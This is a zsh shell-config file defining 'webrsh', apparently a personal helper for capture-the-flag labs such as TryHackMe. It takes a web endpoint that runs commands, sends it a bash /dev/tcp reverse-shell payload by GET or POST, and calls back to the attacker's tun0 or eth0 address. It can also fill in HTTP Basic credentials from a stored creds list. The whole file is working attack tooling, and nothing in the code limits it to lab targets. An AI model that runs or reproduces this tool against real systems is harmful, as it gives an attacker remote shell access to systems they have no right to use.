# ========================
# reverse shell helper (webrsh)
# ========================

_webrsh-param-default() {
  echo "${WEBRSH_PARAM:-${RCECURL_PARAM:-cmd}}"
}

_webrsh-method-default() {
  echo "${(U)${WEBRSH_METHOD:-${RCECURL_METHOD:-GET}}}"
}

_webrsh-resolve-url() {
  local spec="$1"
  local ip

  if [[ "$spec" == http://* || "$spec" == https://* ]]; then
    print -r -- "$spec"
    return 0
  fi

  ip="$(_recon-ip-default 2>/dev/null)" || {
    echo "[-] webrsh: no \$IP (target-set <ip> / cases set <room> first)" >&2
    return 1
  }

  python3 - "$ip" "$spec" <<'PY'
import re
import sys

ip, spec = sys.argv[1], sys.argv[2].strip()
if not spec:
    sys.exit(2)

def path_from_tail(tail: str) -> str:
    tail = (tail or "").strip("/")
    return f"/{tail}" if tail else "/"

if spec.startswith(":"):
    m = re.match(r"^:(\d+)(?:/(.*))?$", spec)
    if not m:
        sys.exit(2)
    port = int(m.group(1))
    path = path_from_tail(m.group(2))
    scheme = "https" if port == 443 else "http"
    if port in (80, 443):
        print(f"{scheme}://{ip}{path}")
    else:
        print(f"{scheme}://{ip}:{port}{path}")
    sys.exit(0)

path = spec if spec.startswith("/") else f"/{spec}"
print(f"http://{ip}{path}")
PY
}

_webrsh-is-target() {
  [[ -n "${1:-}" && "${1:-}" != -* ]]
}

# Resolve HTTP Basic auth for curl (--user). Sets _WEBRSH_CURL_AUTH or clears it.
# spec: user, user:pass, or empty (then WEBRSH_AUTH / WEBRSH_USER+WEBRSH_PASS)
_webrsh-resolve-auth() {
  local spec="${1:-}" target="${2:-}"
  local ip user pass

  _WEBRSH_CURL_AUTH=()

  if [[ -z "$spec" && -z "${WEBRSH_AUTH:-}" && -z "${WEBRSH_USER:-}" ]]; then
    return 0
  fi

  if [[ -n "${WEBRSH_AUTH:-}" ]]; then
    spec="$WEBRSH_AUTH"
  elif [[ -z "$spec" && -n "${WEBRSH_USER:-}" ]]; then
    if [[ -n "${WEBRSH_PASS:-}" ]]; then
      spec="${WEBRSH_USER}:${WEBRSH_PASS}"
    else
      spec="$WEBRSH_USER"
    fi
  fi

  if [[ "$spec" == *:* ]]; then
    user="${spec%%:*}"
    pass="${spec#*:}"
  else
    user="$spec"
    ip="$(python3 -c 'from urllib.parse import urlparse; import sys; print(urlparse(sys.argv[1]).hostname or "")' "$target" 2>/dev/null)"
    [[ -z "$ip" ]] && ip="$(_recon-ip-default 2>/dev/null)"
    if [[ -z "$ip" ]]; then
      echo "[-] webrsh: cannot resolve target IP for creds-list (use -u user:pass)" >&2
      return 1
    fi
    if ! pass="$(_recon-creds-for-user "$ip" "$user" 2>/dev/null)"; then
      echo "[-] webrsh: no password for ${user}@${ip} (creds-list / use -u user:pass)" >&2
      return 1
    fi
    echo "[*] auth: ${user}@${ip} (creds-list)" >&2
  fi

  if [[ -z "$user" ]]; then
    return 0
  fi

  if [[ "$spec" == *:* ]]; then
    echo "[*] auth: ${user} (inline)" >&2
  fi

  _WEBRSH_CURL_AUTH=(--user "${user}:${pass}")
}

# LHOST for reverse shells (TryHackMe VPN → tun0)
_revshell-lhost() {
  local ip
  ip=$(ip -o -4 addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  [[ -n "$ip" ]] && { echo "$ip"; return 0 }
  ip=$(ip -o -4 addr show eth0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  [[ -n "$ip" ]] && { echo "$ip"; return 0 }
  return 1
}

# Attacker IPv4 only (stdout) — tun0, else eth0
lhost() {
  if [[ $# -ge 1 && ( "$1" == -h || "$1" == --help ) ]]; then
    echo "usage: lhost"
    echo "  print attacker IPv4 (tun0 → eth0) for reverse shells, ping, MSF LHOST"
    return 0
  fi
  if [[ $# -ne 0 ]]; then
    echo "usage: lhost  (try: lhost -h)" >&2
    return 1
  fi
  _revshell-lhost || {
    echo "[-] LHOST not found (bring up tun0 VPN or eth0)" >&2
    return 1
  }
}

_webrsh-trigger() {
  local target="$1"
  local port="${2:-4444}"
  local param="${3:-$(_webrsh-param-default)}"
  local method="${(U)${4:-$(_webrsh-method-default)}}"
  local auth_spec="${5:-}"
  local lhost
  local -a curl_auth=()

  lhost="$(_revshell-lhost)" || {
    echo "[-] LHOST not found (tun0/eth0)" >&2
    return 1
  }

  _webrsh-resolve-auth "$auth_spec" "$target" || return 1
  curl_auth=("${_WEBRSH_CURL_AUTH[@]}")

  local cmd="bash -c 'bash -i >& /dev/tcp/${lhost}/${port} 0>&1'"
  local enc
  enc=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))' "$cmd")

  echo "[*] LHOST=$lhost port=$port method=${method} param=${param}" >&2

  case "$method" in
    GET)
      echo "[*] GET ${target}?${param}=..." >&2
      curl -sS "${curl_auth[@]}" "${target}?${param}=${enc}"
      ;;
    POST)
      echo "[*] POST ${target} (${param}=...)" >&2
      curl -sS "${curl_auth[@]}" -X POST --data-urlencode "${param}=${cmd}" "$target"
      ;;
    *)
      echo "[-] webrsh: unknown method: $method (use GET or POST)" >&2
      return 1
      ;;
  esac
  echo ""
}

webrsh() {
  local param="$(_webrsh-param-default)"
  local method="$(_webrsh-method-default)"
  local target_spec="" target="" listen_port="4444" auth_spec=""

  (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -h|--help)
        echo "usage: webrsh [options] [path|url]"
        echo "web RCE → reverse shell (tun0 auto LHOST)"
        echo "  path/url uses \$IP when omitted:"
        echo "    /home.php  home.php  :8080/home.php  http://host/shell.php"
        echo ""
        echo "options:"
        echo "  -X, --method METHOD   GET (default) or POST (or \$WEBRSH_METHOD)"
        echo "  --post                shortcut for -X POST"
        echo "  -p, --param NAME      RCE parameter (default: cmd, or \$WEBRSH_PARAM)"
        echo "  -P, --listen-port N   revshell listener port (default: 4444)"
        echo "  -u, --user USER[:PASS]  HTTP Basic Auth (PASS from creds-list if omitted)"
        echo "                          or \$WEBRSH_AUTH / \$WEBRSH_USER+\$WEBRSH_PASS"
        echo ""
        echo "examples:"
        echo "  webrsh /home.php -p command -X POST"
        echo "  webrsh home.php -p command --post"
        echo "  webrsh :8080/home.php -p command -X POST -P 5555"
        echo "  webrsh http://\$IP/shell.php"
        echo "  webrsh /webdav/shell.php -u wampp          # creds-list"
        echo "  webrsh /webdav/shell.php -u wampp:xampp"
        return 0
        ;;
      -u|--user)
        auth_spec="$2"
        shift 2
        ;;
      -X|--method|--request)
        method="${(U)2}"
        shift 2
        ;;
      --post)
        method=POST
        shift
        ;;
      -p|--param)
        param="$2"
        shift 2
        ;;
      -P|--listen-port|--port)
        listen_port="$2"
        shift 2
        ;;
      *)
        if _webrsh-is-target "$1"; then
          if [[ -n "$target_spec" ]]; then
            echo "[-] webrsh: multiple targets: ${target_spec} and $1" >&2
            return 1
          fi
          target_spec="$1"
        else
          echo "usage: webrsh [options] [path|url]" >&2
          return 1
        fi
        shift
        ;;
    esac
  done

  if [[ -z "$target_spec" ]]; then
    echo "usage: webrsh [options] [path|url]" >&2
    return 1
  fi

  target="$(_webrsh-resolve-url "$target_spec")" || return 1

  _webrsh-trigger "$target" "$listen_port" "$param" "$method" "$auth_spec"
}

_webrsh() {
  _arguments \
    '-X[HTTP method]:method:(GET POST)' \
    '--post[use POST]' \
    '-p[RCE parameter name]:param name:(cmd command)' \
    '-P[revshell listener port]:port:(4444 5555 6666)' \
    '-u[HTTP Basic user or user:pass]:user:' \
    '1:path or url:(/home.php home.php :8080/home.php)' \
    '*:path or url:(/home.php home.php :8080/home.php)'
}

compdef _webrsh webrsh
